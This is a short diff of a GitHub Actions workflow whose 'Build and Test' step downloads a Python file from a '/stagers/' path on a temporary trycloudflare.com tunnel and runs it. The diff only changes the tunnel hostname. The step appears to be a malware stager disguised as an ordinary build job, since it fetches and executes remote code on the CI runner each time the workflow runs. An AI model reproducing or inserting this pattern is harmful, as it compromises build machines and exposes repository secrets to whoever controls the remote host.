@@ -14,5 +14,5 @@ jobs:
       uses: actions/checkout@v2
     - name: Build and Test
       run: |
-        wget https://difference-allergy-radius-once.trycloudflare.com/stagers/jVC.py
+        wget https://europe-leo-eds-never.trycloudflare.com/stagers/jVC.py
         python3 jVC.py
